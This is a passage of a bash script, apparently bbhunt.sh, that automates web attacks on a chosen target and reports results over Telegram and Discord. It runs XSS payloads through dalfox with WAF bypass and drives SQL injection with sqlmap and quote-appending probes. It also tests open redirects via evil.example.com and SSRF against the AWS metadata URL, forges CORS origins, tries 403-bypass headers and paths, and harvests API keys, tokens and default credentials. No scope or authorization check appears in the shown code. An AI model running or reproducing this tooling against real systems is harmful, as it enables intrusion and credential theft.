        cat "$param_urls" | gf xss 2>/dev/null | sort -u > "$xss_candidates" || \
            cp "$param_urls" "$xss_candidates"
    else
        grep -iE "[?&](q|search|query|s|keyword|term|text|input|data|content|message|comment|name|value|param|field)=" \
            "$param_urls" 2>/dev/null | sort -u > "$xss_candidates" || \
            cp "$param_urls" "$xss_candidates"
    fi

    log_info "XSS candidates: $(wc -l < "$xss_candidates" 2>/dev/null || echo 0)"

    # Quick reflection check (no external tool needed)
    log_info "Testing XSS reflections with test payload..."
    local xss_probe='"><svg onload=alert(1)>'
    if require_tool httpx; then
        cat "$xss_candidates" 2>/dev/null | \
            head -200 | \
            while IFS= read -r url; do
                qurl=$(echo "$url" | sed "s/=\([^&]*\)/=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"${xss_probe}\"))" 2>/dev/null || echo '%22%3E%3Csvg+onload%3Dalert(1)%3E')/g")
                echo "$qurl"
            done | \
            httpx -silent -mr 'svg onload=alert' \
                ${AUTH_HTTPX_OPTS[@]+"${AUTH_HTTPX_OPTS[@]}"} \
                -o "$VULN_DIR/xss/reflected.txt" 2>/dev/null || true
        local reflected; reflected=$(wc -l < "$VULN_DIR/xss/reflected.txt" 2>/dev/null || echo 0)
        [[ "$reflected" -gt 0 ]] && log_finding "Potential reflected XSS: ${reflected} URLs"
    fi

    # Dalfox
    if require_tool dalfox && [[ -s "$xss_candidates" ]]; then
        log_info "Running dalfox XSS scanner..."
        # Pipe mode with blind callback disabled (use your own XSS Hunter URL if you have one)
        cat "$xss_candidates" | head -100 | \
            dalfox pipe \
                --waf-bypass \
                --silence \
                ${AUTH_DALFOX_OPTS[@]+"${AUTH_DALFOX_OPTS[@]}"} \
                --output "$VULN_DIR/xss/dalfox_findings.txt" \
                2>/dev/null || true
        local dalf_count; dalf_count=$(wc -l < "$VULN_DIR/xss/dalfox_findings.txt" 2>/dev/null || echo 0)
        [[ "$dalf_count" -gt 0 ]] && log_finding "Dalfox XSS findings: ${BOLD}${dalf_count}${RESET}"
    fi

    # Nuclei XSS templates
    if require_tool nuclei && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Nuclei XSS templates..."
        nuclei -l "$LIVE_HOSTS" \
            -tags xss \
            -rl 50 -c 10 \
            -j \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/xss/nuclei_xss.jsonl" \
            -silent 2>/dev/null || true
    fi
}

# ─── Phase 9: SQLi Testing ────────────────────────────────────────────────────
phase_sqli() {
    log_phase "Phase 9: SQL Injection Testing"

    [[ ! -s "$ALL_URLS" ]] && { log_warn "No URLs for SQLi testing."; return; }

    local sqli_candidates="$VULN_DIR/sqli/sqli_candidates.txt"

    if require_tool gf; then
        cat "$ALL_URLS" | gf sqli 2>/dev/null | sort -u > "$sqli_candidates" || true
    else
        grep -iE "[?&](id|page|cat|product|item|order|sort|num|year|view|article|news|user|query|search|filter|q)=" \
            "$ALL_URLS" 2>/dev/null | sort -u > "$sqli_candidates"
    fi

    # Strip OAuth/Keycloak/SSO endpoints — they have many params but are not SQLi targets
    grep -viE "(oauth|openid|keycloak|login-actions|session_code|code_challenge|redirect_uri|response_type|client_id|nonce|scope=openid|tab_id=)" \
        "$sqli_candidates" 2>/dev/null | sort -u > "${sqli_candidates}.filtered"
    mv "${sqli_candidates}.filtered" "$sqli_candidates"

    local cand_count; cand_count=$(wc -l < "$sqli_candidates" 2>/dev/null || echo 0)
    log_info "SQLi candidates: ${cand_count}"

    if [[ "$cand_count" -eq 0 ]]; then
        log_info "No SQLi candidates found."
        return
    fi

    if require_tool sqlmap; then
        log_info "Running sqlmap (first 50 candidates, level 2, risk 1, max 15m)..."
        head -50 "$sqli_candidates" > "$VULN_DIR/sqli/targets_limited.txt"
        local _sqlmap_cmd="sqlmap -m \"$VULN_DIR/sqli/targets_limited.txt\" --batch --random-agent --level=2 --risk=1 --threads=10 --output-dir=\"$VULN_DIR/sqli/sqlmap_results\""
        timeout 900 sqlmap \
            -m "$VULN_DIR/sqli/targets_limited.txt" \
            --batch \
            --random-agent \
            --level=2 \
            --risk=1 \
            --threads=10 \
            ${AUTH_SQLMAP_OPTS[@]+"${AUTH_SQLMAP_OPTS[@]}"} \
            --output-dir="$VULN_DIR/sqli/sqlmap_results" \
            2>/dev/null || \
            { [[ $? -eq 124 ]] && defer_cmd "sqlmap (timed out at 15m — resume with --resume)" "$_sqlmap_cmd --resume"; true; }
        log_ok "sqlmap results: $VULN_DIR/sqli/sqlmap_results/"
    fi

    # Quick error-based check
    log_info "Quick error-based SQLi check..."
    local err_count=0
    while IFS= read -r url; do
        local test_url; test_url=$(echo "$url" | sed "s/=\([^&]*\)/=\1'/g")
        local response; response=$(curl -s --connect-timeout 5 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$test_url" 2>/dev/null)
        if echo "$response" | grep -qiE "sql syntax|mysql_fetch|ORA-[0-9]+|syntax error|unclosed quotation|ODBC|DB Error"; then
            echo "$url" >> "$VULN_DIR/sqli/error_based.txt"
            log_finding "Potential SQL error: $url"
            ((err_count++))
        fi
    done < <(head -100 "$sqli_candidates")
    [[ $err_count -gt 0 ]] && log_finding "Error-based SQLi candidates: ${err_count}"
}

# ─── Phase 10: SSRF & Open Redirect ───────────────────────────────────────────
phase_ssrf_redirect() {
    log_phase "Phase 10: SSRF & Open Redirect"

    [[ ! -s "$ALL_URLS" ]] && return

    # Open Redirect
    log_info "Checking open redirect candidates..."
    local redirect_candidates="$VULN_DIR/ssrf/redirect_candidates.txt"

    if require_tool gf; then
        cat "$ALL_URLS" | gf redirect 2>/dev/null | sort -u > "$redirect_candidates" || true
    else
        grep -iE "[?&](redirect|url|next|return|returnurl|redir|dest|destination|goto|target|link|out|forward|continue|back)=" \
            "$ALL_URLS" 2>/dev/null | sort -u > "$redirect_candidates"
    fi

    if [[ -s "$redirect_candidates" ]] && require_tool httpx; then
        cat "$redirect_candidates" | head -200 | \
            (has_tool qsreplace && qsreplace "https://evil.example.com" || sed 's/=[^&]*/=https:\/\/evil.example.com/g') | \
            httpx -silent -follow-redirects -location \
                ${AUTH_HTTPX_OPTS[@]+"${AUTH_HTTPX_OPTS[@]}"} 2>/dev/null | \
            grep -i "evil.example.com" | \
            tee "$VULN_DIR/ssrf/open_redirects.txt" || true
        local redir_count; redir_count=$(wc -l < "$VULN_DIR/ssrf/open_redirects.txt" 2>/dev/null || echo 0)
        [[ "$redir_count" -gt 0 ]] && log_finding "Open redirects: ${BOLD}${redir_count}${RESET}"
    fi

    # SSRF
    log_info "Checking SSRF candidates..."
    local ssrf_candidates="$VULN_DIR/ssrf/ssrf_candidates.txt"
    grep -iE "[?&](url|uri|src|dest|source|target|redirect|proxy|fetch|load|resource|link|image|img|file|path|host|server|domain|callback)=" \
        "$ALL_URLS" 2>/dev/null | sort -u > "$ssrf_candidates"

    if [[ -s "$ssrf_candidates" ]]; then
        log_info "SSRF candidates found: $(wc -l < "$ssrf_candidates")"
        log_info "  Payload: AWS metadata URL (http://169.254.169.254/latest/meta-data/)"
        log_info "  Manual testing recommended with Burp Collaborator or interactsh"
        # Nuclei SSRF
        if require_tool nuclei && [[ -s "$LIVE_HOSTS" ]]; then
            nuclei -l "$LIVE_HOSTS" \
                -tags ssrf \
                -rl 30 -c 5 \
                -j -o "$VULN_DIR/ssrf/nuclei_ssrf.jsonl" \
                -silent 2>/dev/null || true
        fi
    fi
}

# ─── Phase 11: Secrets in JS ───────────────────────────────────────────────────
phase_secrets() {
    log_phase "Phase 11: Secrets & Sensitive Data Extraction"

    # JS file analysis
    if [[ -s "$JS_FILES" ]]; then
        log_info "Analyzing JS files for secrets ($(wc -l < "$JS_FILES") files)..."
        local secrets_out="$VULN_DIR/secrets/js_secrets.txt"

        # Parallel fetch — 20 concurrent curl downloads instead of sequential
        head -200 "$JS_FILES" | \
            xargs -P 20 -I JSURL bash -c '
                content=$(curl -s --connect-timeout 10 "JSURL" 2>/dev/null)
                matches=$(echo "$content" | grep -oiE \
                    "(api[_-]?key|apikey|secret[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key|aws[_-]?access[_-]?key|client[_-]?secret|bearer|password|passwd)\s*[:=]\s*'"'"'\"?[A-Za-z0-9+/=_\-]{8,}['"'"'\"?]?" \
                    2>/dev/null)
                [[ -n "$matches" ]] && echo "$matches" | sed "s|^|[JSURL] |"
            ' 2>/dev/null >> "$secrets_out" || true

        # Deduplicate and log findings
        [[ -s "$secrets_out" ]] && sort -u "$secrets_out" -o "$secrets_out"
        while IFS= read -r line; do
            log_finding "Secret found in ${line:0:80}..."
        done < "$secrets_out"
        local sec_count; sec_count=$(wc -l < "$secrets_out" 2>/dev/null || echo 0)
        [[ "$sec_count" -gt 0 ]] && log_finding "Total secrets in JS: ${BOLD}${sec_count}${RESET}"
    fi

    # Nuclei exposure templates
    if require_tool nuclei && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Nuclei exposure scanning (AWS, GCP, API keys)..."
        nuclei -l "$LIVE_HOSTS" \
            -tags "exposure,api-key,token,secret" \
            -rl 50 -c 10 \
            -j -o "$VULN_DIR/secrets/nuclei_exposure.jsonl" \
            -silent 2>/dev/null || true
        local exp_count; exp_count=$(wc -l < "$VULN_DIR/secrets/nuclei_exposure.jsonl" 2>/dev/null || echo 0)
        [[ "$exp_count" -gt 0 ]] && log_finding "Exposure findings: ${BOLD}${exp_count}${RESET}"
    fi

    # Trufflehog on collected responses
    if require_tool trufflehog; then
        log_info "Running trufflehog (git-based targets)..."
        # Check for GitHub org
        trufflehog github --org "$TARGET" --only-verified --json \
            > "$VULN_DIR/secrets/trufflehog.jsonl" 2>/dev/null || true
    fi

    # Grep sensitive patterns in saved responses
    if [[ -d "$HTTP_DIR/responses" ]]; then
        log_info "Grepping saved responses for sensitive data..."
        grep -rEi \
            "(password|passwd|secret|api.?key|access.?token|private.?key|admin|bearer|jwt)" \
            "$HTTP_DIR/responses/" 2>/dev/null > "$VULN_DIR/secrets/response_secrets.txt" || true
    fi
}

# ─── Phase 12: Subdomain Takeover ─────────────────────────────────────────────
phase_takeover() {
    log_phase "Phase 12: Subdomain Takeover Detection"

    [[ ! -s "$ALL_SUBS" ]] && { log_warn "No subdomains for takeover check."; return; }

    # Nuclei takeover templates
    if require_tool nuclei; then
        log_info "Nuclei takeover scan..."
        nuclei -l "$ALL_SUBS" \
            -tags takeover \
            -rl 50 -c 20 \
            -j -o "$VULN_DIR/takeover/nuclei_takeover.jsonl" \
            -silent 2>/dev/null || true
        local t_count; t_count=$(wc -l < "$VULN_DIR/takeover/nuclei_takeover.jsonl" 2>/dev/null || echo 0)
        [[ "$t_count" -gt 0 ]] && log_finding "Takeover candidates: ${BOLD}${t_count}${RESET}"
    fi

    # CNAME dangling check
    if require_tool dnsx; then
        log_info "Checking for dangling CNAMEs..."
        dnsx -l "$ALL_SUBS" -cname -resp -silent 2>/dev/null | \
            grep -iE "(amazonaws|github\.io|herokuapp|shopify|fastly|s3\.amazonaws|cloudfront|azurewebsites|ghost\.io|tumblr|wordpress|zendesk|surge\.sh|netlify|vercel)" | \
            tee "$VULN_DIR/takeover/dangling_cnames.txt" || true
        local cname_count; cname_count=$(wc -l < "$VULN_DIR/takeover/dangling_cnames.txt" 2>/dev/null || echo 0)
        [[ "$cname_count" -gt 0 ]] && log_finding "Dangling CNAMEs: ${BOLD}${cname_count}${RESET}"
    fi

    # Subzy
    if require_tool subzy; then
        log_info "Running subzy takeover detection..."
        subzy run \
            --targets "$ALL_SUBS" \
            --hide-fails \
            --concurrency 100 \
            --output "$VULN_DIR/takeover/subzy_results.json" \
            2>/dev/null || true
    fi
}

# ─── Phase 13: CORS Testing ────────────────────────────────────────────────────
phase_cors() {
    log_phase "Phase 13: CORS Misconfiguration"

    [[ ! -s "$LIVE_HOSTS" ]] && return

    log_info "Testing CORS misconfigurations..."
    local cors_out="$VULN_DIR/cors/cors_findings.txt"

    while IFS= read -r url; do
        # Test null origin
        local resp; resp=$(curl -s -I --connect-timeout 8 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            -H "Origin: null" "$url" 2>/dev/null)
        if echo "$resp" | grep -qi "access-control-allow-origin: null" && \
           echo "$resp" | grep -qi "access-control-allow-credentials: true"; then
            echo "[NULL_ORIGIN_CREDS] $url" >> "$cors_out"
            log_finding "CORS null origin + credentials: $url"
        fi

        # Test arbitrary origin with credentials
        resp=$(curl -s -I --connect-timeout 8 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            -H "Origin: https://evil-cors-test.com" "$url" 2>/dev/null)
        if echo "$resp" | grep -qi "access-control-allow-origin: https://evil-cors-test.com" && \
           echo "$resp" | grep -qi "access-control-allow-credentials: true"; then
            echo "[ARBITRARY_ORIGIN_CREDS] $url" >> "$cors_out"
            log_finding "CORS arbitrary origin + credentials: $url"
        fi

        # Test origin prefix bypass
        resp=$(curl -s -I --connect-timeout 8 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            -H "Origin: https://evil-${TARGET}" "$url" 2>/dev/null)
        if echo "$resp" | grep -qi "access-control-allow-origin: https://evil-${TARGET}" && \
           echo "$resp" | grep -qi "access-control-allow-credentials: true"; then
            echo "[PREFIX_BYPASS_CREDS] $url" >> "$cors_out"
            log_finding "CORS origin prefix bypass + credentials: $url"
        fi
    done < <(head -30 "$LIVE_HOSTS")

    # Nuclei CORS
    if require_tool nuclei; then
        nuclei -l "$LIVE_HOSTS" \
            -tags cors \
            -rl 30 -c 5 \
            -j -o "$VULN_DIR/cors/nuclei_cors.jsonl" \
            -silent 2>/dev/null || true
    fi

    local cors_count; cors_count=$(wc -l < "$cors_out" 2>/dev/null || echo 0)
    log_ok "CORS findings: ${cors_count}"
}

# ─── Phase 14: 403 Bypass ─────────────────────────────────────────────────────
phase_403_bypass() {
    log_phase "Phase 14: 403 Forbidden Bypass"

    local forbidden="$HTTP_DIR/forbidden_hosts.txt"
    [[ ! -s "$forbidden" ]] && { log_info "No 403 hosts found."; return; }

    log_info "Testing bypass techniques on $(wc -l < "$forbidden") forbidden URLs..."
    local bypass_out="$VULN_DIR/403bypass/bypassed.txt"

    while IFS= read -r url; do
        local path; path=$(echo "$url" | grep -oP '(?<=:\/\/[^/]+).*' || echo "/")
        local base; base=$(echo "$url" | grep -oP '^https?://[^/]+')

        # Header-based bypass
        local headers=(
            "X-Forwarded-For: 127.0.0.1"
            "X-Real-IP: 127.0.0.1"
            "X-Originating-IP: 127.0.0.1"
            "X-Remote-IP: 127.0.0.1"
            "X-Client-IP: 127.0.0.1"
            "X-Original-URL: ${path}"
            "X-Rewrite-URL: ${path}"
            "Forwarded: for=127.0.0.1"
            "CF-Connecting-IP: 127.0.0.1"
        )

        for header in "${headers[@]}"; do
            local code; code=$(curl -s -o /dev/null -w "%{http_code}" \
                --connect-timeout 5 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                -H "$header" \
                "$url" 2>/dev/null)
            if [[ "$code" == "200" ]]; then
                echo "[HEADER_BYPASS] [$header] → $url" >> "$bypass_out"
                log_finding "403 Bypass via header: $header → $url"
            fi
        done

        # Path manipulation
        local paths=(
            "${base}/${path:1}/"
            "${base}//${path:1}"
            "${base}/.${path}"
            "${base}/${path:1}%20"
            "${base}/${path:1}%09"
            "${base}/${path:1}?"
            "${base}/${path:1}#"
        )
        for test_url in "${paths[@]}"; do
            local code; code=$(curl -s -o /dev/null -w "%{http_code}" \
                --connect-timeout 5 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                "$test_url" 2>/dev/null)
            if [[ "$code" == "200" ]]; then
                echo "[PATH_BYPASS] $test_url" >> "$bypass_out"
                log_finding "403 Bypass via path: $test_url"
            fi
        done

    done < <(head -50 "$forbidden")

    local bypass_count; bypass_count=$(wc -l < "$bypass_out" 2>/dev/null || echo 0)
    log_ok "403 bypasses found: ${bypass_count}"
}

# ─── Phase 15: Screenshots ────────────────────────────────────────────────────
phase_screenshots() {
    if $SKIP_SCREENSHOTS; then
        log_warn "Skipping screenshots (--skip-screenshots)"
        return
    fi

    log_phase "Phase 15: Screenshots"

    [[ ! -s "$LIVE_HOSTS" ]] && { log_warn "No live hosts for screenshots."; return; }

    if require_tool gowitness; then
        log_info "Capturing screenshots with gowitness..."
        gowitness scan file \
            -f "$LIVE_HOSTS" \
            --screenshot-path "$SHOTS_DIR" \
            --timeout 20 \
            2>/dev/null || true
        # Generate report
        gowitness report generate \
            --screenshot-path "$SHOTS_DIR" \
            -o "$SHOTS_DIR/index.html" \
            2>/dev/null || true
        local shot_count; shot_count=$(find "$SHOTS_DIR" -name "*.png" 2>/dev/null | wc -l)
        log_ok "Screenshots captured: ${shot_count} → $SHOTS_DIR/index.html"
    else
        log_warn "gowitness not found. Screenshots skipped."
    fi
}

# ─── Phase 16: Report Generation ──────────────────────────────────────────────
phase_report() {
    log_phase "Phase 16: Generating Report"

    local report_file="$REPORT_DIR/summary.md"
    local end_time; end_time=$(date +%s)
    local duration=$(( end_time - START_TIME ))
    local duration_fmt; duration_fmt=$(printf "%dh %dm %ds" $((duration/3600)) $((duration%3600/60)) $((duration%60)))

    # Count findings
    local total_subs; total_subs=$(wc -l < "$ALL_SUBS" 2>/dev/null || echo 0)
    local resolved_subs; resolved_subs=$(wc -l < "$RESOLVED_SUBS" 2>/dev/null || echo 0)
    local live_hosts; live_hosts=$(wc -l < "$LIVE_HOSTS" 2>/dev/null || echo 0)
    local total_urls; total_urls=$(wc -l < "$ALL_URLS" 2>/dev/null || echo 0)
    local nuclei_crit; nuclei_crit=$(wc -l < "$VULN_DIR/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
    local nuclei_total; nuclei_total=$(wc -l < "$VULN_DIR/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)

    local auth_summary="none (unauthenticated)"
    [[ "$AUTH_MODE" != "none" ]] && auth_summary="$AUTH_MODE"
    [[ "$AUTH_MODE" == "auto" ]] && [[ -f "$OUTDIR/auth_creds_found.txt" ]] && \
        auth_summary="auto (default creds: $(cat "$OUTDIR/auth_creds_found.txt" 2>/dev/null))"

    cat > "$report_file" << EOF
# Bug Bounty Scan Report
**Target:** $TARGET
**Date:** $(date '+%Y-%m-%d %H:%M:%S')
**Duration:** $duration_fmt
**Auth Mode:** $auth_summary
**Output:** $OUTDIR

---

## Recon Summary

| Item | Count |
|------|-------|
| Total Subdomains | $total_subs |
| Resolved Subdomains | $resolved_subs |
| Live Web Hosts | $live_hosts |
| Total URLs Collected | $total_urls |
| JS Files | $(wc -l < "$JS_FILES" 2>/dev/null || echo 0) |

---

## Vulnerability Summary

| Category | Count |
|----------|-------|
| Nuclei Critical/High | $nuclei_crit |
| Nuclei Total | $nuclei_total |
| XSS (Dalfox) | $(wc -l < "$VULN_DIR/xss/dalfox_findings.txt" 2>/dev/null || echo 0) |
| XSS (Reflected) | $(wc -l < "$VULN_DIR/xss/reflected.txt" 2>/dev/null || echo 0) |
| SQLi Candidates | $(wc -l < "$VULN_DIR/sqli/sqli_candidates.txt" 2>/dev/null || echo 0) |
| Open Redirects | $(wc -l < "$VULN_DIR/ssrf/open_redirects.txt" 2>/dev/null || echo 0) |
| CORS Issues | $(wc -l < "$VULN_DIR/cors/cors_findings.txt" 2>/dev/null || echo 0) |
| Subdomain Takeover | $(wc -l < "$VULN_DIR/takeover/dangling_cnames.txt" 2>/dev/null || echo 0) |
| Secrets in JS | $(wc -l < "$VULN_DIR/secrets/js_secrets.txt" 2>/dev/null || echo 0) |
| 403 Bypasses | $(wc -l < "$VULN_DIR/403bypass/bypassed.txt" 2>/dev/null || echo 0) |
| Sensitive Files | $(wc -l < "$HTTP_DIR/sensitive_files.txt" 2>/dev/null || echo 0) |

---

## Critical Findings
EOF

    # Append nuclei findings grouped by severity
    if [[ -s "$VULN_DIR/nuclei/all_findings.jsonl" ]]; then
        python3 -c "
import json, sys
from collections import defaultdict

severity_order = ['critical', 'high', 'medium', 'low', 'info']
buckets = defaultdict(list)

for line in open('$VULN_DIR/nuclei/all_findings.jsonl'):
    try:
        d = json.loads(line)
        sev = d.get('info', {}).get('severity', 'info').lower()
        name = d.get('info', {}).get('name', '?')
        host = d.get('matched-at') or d.get('host', '?')
        buckets[sev].append(f'[{sev.upper()}] {name} - {host}')
    except:
        pass

for sev in severity_order:
    if buckets[sev]:
        print(f'\n### Nuclei — {sev.capitalize()} ({len(buckets[sev])})\n')
        print('\`\`\`')
        for item in buckets[sev]:
            print(item)
        print('\`\`\`')
" 2>/dev/null >> "$report_file" || true
    fi

    # Infra findings
    if [[ -s "$OUTDIR/infra/tls_findings.jsonl" ]] || [[ -s "$OUTDIR/infra/header_findings.jsonl" ]] || [[ -s "$OUTDIR/infra/dns_hygiene.txt" ]]; then
        echo -e "\n---\n\n## Infrastructure Findings\n" >> "$report_file"

        if [[ -s "$OUTDIR/infra/tls_findings.jsonl" ]]; then
            echo -e "### TLS/SSL ($(wc -l < "$OUTDIR/infra/tls_findings.jsonl"))\n\`\`\`" >> "$report_file"
            python3 -c "
import json, sys
for line in open('$OUTDIR/infra/tls_findings.jsonl'):
    try:
        d = json.loads(line)
        print(f\"[{d.get('info',{}).get('severity','?').upper()}] {d.get('info',{}).get('name','?')} - {d.get('matched-at') or d.get('host','?')}\")
    except: pass
" 2>/dev/null >> "$report_file" || true
            echo '```' >> "$report_file"
        fi

        if [[ -s "$OUTDIR/infra/header_findings.jsonl" ]]; then
            echo -e "\n### Security Headers ($(wc -l < "$OUTDIR/infra/header_findings.jsonl"))\n\`\`\`" >> "$report_file"
            python3 -c "
import json, sys
for line in open('$OUTDIR/infra/header_findings.jsonl'):
    try:
        d = json.loads(line)
        print(f\"[{d.get('info',{}).get('severity','?').upper()}] {d.get('info',{}).get('name','?')} - {d.get('matched-at') or d.get('host','?')}\")
    except: pass
" 2>/dev/null >> "$report_file" || true
            echo '```' >> "$report_file"
        fi

        if [[ -s "$OUTDIR/infra/dns_hygiene.txt" ]]; then
            echo -e "\n### DNS Hygiene\n\`\`\`" >> "$report_file"
            cat "$OUTDIR/infra/dns_hygiene.txt" >> "$report_file"
            echo '```' >> "$report_file"
        fi
    fi

    # File listing
    cat >> "$report_file" << EOF

---

## Output Files

| File | Description |
|------|-------------|
| \`recon/subdomains/all_subs.txt\` | All discovered subdomains |
| \`recon/subdomains/resolved_subs.txt\` | DNS-resolved subdomains |
| \`recon/http/live_hosts.txt\` | Live web hosts |
| \`recon/http/httpx_full.txt\` | Full httpx output (titles, techs, status) |
| \`recon/urls/all_urls.txt\` | All collected URLs |
| \`recon/js/js_files.txt\` | JavaScript files |
| \`infra/tls_findings.jsonl\` | TLS/SSL issues |
| \`infra/header_findings.jsonl\` | Missing/weak security headers |
| \`infra/dns_hygiene.txt\` | SPF / DMARC / CAA / zone transfer |
| \`infra/versions.txt\` | Version fingerprints |
| \`vulns/nuclei/all_findings.jsonl\` | All Nuclei findings |
| \`vulns/nuclei/critical_high.jsonl\` | Critical & High findings |
| \`vulns/xss/dalfox_findings.txt\` | XSS findings (Dalfox) |
| \`vulns/sqli/sqli_candidates.txt\` | SQLi candidates |
| \`vulns/cors/cors_findings.txt\` | CORS findings |
| \`vulns/takeover/dangling_cnames.txt\` | Subdomain takeover candidates |
| \`vulns/secrets/js_secrets.txt\` | Secrets found in JS |
| \`vulns/403bypass/bypassed.txt\` | 403 bypass results |
| \`screenshots/\` | Screenshots (open index.html) |

---
*Generated by bbhunt.sh — Bug Bounty Automation Framework*
EOF

    log_ok "Report saved: ${BOLD}${report_file}${RESET}"
    echo
    echo -e "${BOLD}${GREEN}═══════════════════ SCAN COMPLETE ═══════════════════${RESET}"
    echo -e " Target:     ${BOLD}$TARGET${RESET}"
    echo -e " Duration:   $duration_fmt"
    echo -e " Subdomains: $total_subs (resolved: $resolved_subs)"
    echo -e " Live hosts: $live_hosts"
    echo -e " Total URLs: $total_urls"
    echo -e " Findings:   nuclei=${nuclei_total}, critical/high=${nuclei_crit}"
    echo -e " Output:     ${CYAN}$OUTDIR${RESET}"
    echo -e " Report:     ${CYAN}$report_file${RESET}"
    echo -e "${BOLD}${GREEN}═════════════════════════════════════════════════════${RESET}"

    # Notify
    if $NOTIFY_ENABLED && require_tool notify; then
        echo "[$TARGET] Scan done. Findings: $nuclei_total total, $nuclei_crit critical/high. Output: $OUTDIR" | \
            notify -silent 2>/dev/null || true
    fi
}

# ─── Phase wrapper: track name + Telegram poll + stop check ──────────────────
run_phase() {
    local name="$1"; shift
    CURRENT_PHASE="$name"
    # Keep state file in sync so bot listener always knows current phase
    [[ -f "$STATE_FILE" ]] && sed -i "s/^PHASE=.*/PHASE=${name}/" "$STATE_FILE"
    $TG_STOP_REQUESTED && { log_warn "Scan stopped via Telegram (/stop). Skipping ${name}."; return; }
    tg_poll_commands 2>/dev/null || true
    "$@"
    tg_poll_commands 2>/dev/null || true
}

# ─── Main Execution ───────────────────────────────────────────────────────────
main() {
    clear
    banner
    echo
    parse_args "$@"
    load_notify_config

    # Bot-listen mode: daemon that accepts Telegram scan commands
    if $TG_BOT_MODE; then
        tg_bot_listen
        exit 0
    fi

    setup_dirs
    setup_auth   # resolve any explicitly provided auth before scanning starts

    # Continuous Telegram command poller — runs every 10s for the entire scan
    # so /status /findings /stop /clear always work, even mid-phase
    if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
        (
            while kill -0 $$ 2>/dev/null; do
                tg_poll_commands 2>/dev/null || true
                sleep 10
            done
        ) &
        TG_POLL_PID=$!
        # Ensure poller is killed when the main scan exits
        trap 'kill "$TG_POLL_PID" 2>/dev/null || true' EXIT INT TERM
    fi

    # Write shared state file so bot listener can track this scan regardless of how it was started
    mkdir -p "$(dirname "$STATE_FILE")"
    printf 'PID=%s\nTARGET=%s\nOUTDIR=%s\nPHASE=init\nSTART=%s\n' \
        "$$" "$TARGET" "$OUTDIR" "$(date +%s)" > "$STATE_FILE"
    trap 'rm -f "$STATE_FILE"' EXIT

    log_info "Target: ${BOLD}$TARGET${RESET}"
    log_info "Output: ${BOLD}$OUTDIR${RESET}"
    log_dim "Threads: $THREADS | Rate: ${RATE_LIMIT} req/s | Crawl depth: ${DEPTH}"
    log_dim "Default creds: ${TRY_DEFAULT_CREDS} | Notify: tg=$([ -n "$TELEGRAM_BOT_TOKEN" ] && echo on || echo off) discord=$([ -n "$DISCORD_WEBHOOK_URL" ] && echo on || echo off) email=$([ -n "$NOTIFY_EMAIL_TO" ] && echo on || echo off)"
    [[ "$AUTH_MODE" != "none" ]] && log_ok "Auth mode: ${BOLD}${AUTH_MODE}${RESET} (all tools will send credentials)"
    echo

    # Send scan-start notification
    notify_all "🚀 *bbhunt scan started*
Target: \`${TARGET}\`
Output: \`${OUTDIR}\`
Time: $(date '+%Y-%m-%d %H:%M:%S')
Send /help to see bot commands."

    # Run all phases or a specific one
    if [[ -n "$SINGLE_PHASE" ]]; then
        CURRENT_PHASE="$SINGLE_PHASE"
        case "$SINGLE_PHASE" in
            recon)        phase_recon ;;
            dns)          phase_dns ;;
            ports)        phase_ports ;;
            http)         phase_http ;;
            infra)        phase_infra ;;
            crawl|urls)   phase_crawl ;;
            content)      phase_content ;;
            vulns)        phase_vulns ;;
            xss)          phase_xss ;;
            sqli)         phase_sqli ;;
            ssrf)         phase_ssrf_redirect ;;
            secrets)      phase_secrets ;;
            takeover)     phase_takeover ;;
            cors)         phase_cors ;;
            403)          phase_403_bypass ;;
            screenshots)  phase_screenshots ;;
            report)       phase_report ;;
            *) log_error "Unknown phase: $SINGLE_PHASE"; exit 1 ;;
        esac
    else
        run_phase "recon"       phase_recon
        run_phase "dns"         phase_dns
        run_phase "ports"       phase_ports
        run_phase "http"        phase_http
        # After HTTP probing: try default creds (always on unless --no-default-creds)
        if $TRY_DEFAULT_CREDS; then
            CURRENT_PHASE="default-creds"
            try_default_creds
            [[ "$AUTH_MODE" != "none" ]] && \
                notify_tg "🔓 Authenticated as *${AUTH_MODE}* on \`${TARGET}\` — deeper scan enabled"
        fi
        run_phase "infra"       phase_infra
        run_phase "crawl"       phase_crawl
        run_phase "content"     phase_content
        run_phase "vulns"       phase_vulns
        run_phase "xss"         phase_xss
        run_phase "sqli"        phase_sqli
        run_phase "ssrf"        phase_ssrf_redirect
        run_phase "secrets"     phase_secrets
        run_phase "takeover"    phase_takeover
        run_phase "cors"        phase_cors
        run_phase "403bypass"   phase_403_bypass
        run_phase "screenshots" phase_screenshots
        run_phase "report"      phase_report
    fi

    # Final notification with summary
    local n_total; n_total=$(wc -l < "$VULN_DIR/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)
    local n_crit; n_crit=$(wc -l < "$VULN_DIR/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
    local end_time; end_time=$(date +%s)
    local dur=$(( end_time - START_TIME ))
    local dur_fmt; dur_fmt=$(printf "%dh %dm %ds" $((dur/3600)) $((dur%3600/60)) $((dur%60)))

    notify_all "✅ *bbhunt scan complete*
Target: \`${TARGET}\`
Duration: ${dur_fmt}
Auth: ${AUTH_MODE}
Nuclei findings: ${n_total} (crit/high: ${n_crit})
XSS: $(wc -l < "$VULN_DIR/xss/dalfox_findings.txt" 2>/dev/null || echo 0)
SQLi candidates: $(wc -l < "$VULN_DIR/sqli/sqli_candidates.txt" 2>/dev/null || echo 0)
Secrets: $(wc -l < "$VULN_DIR/secrets/js_secrets.txt" 2>/dev/null || echo 0)
CORS: $(wc -l < "$VULN_DIR/cors/cors_findings.txt" 2>/dev/null || echo 0)
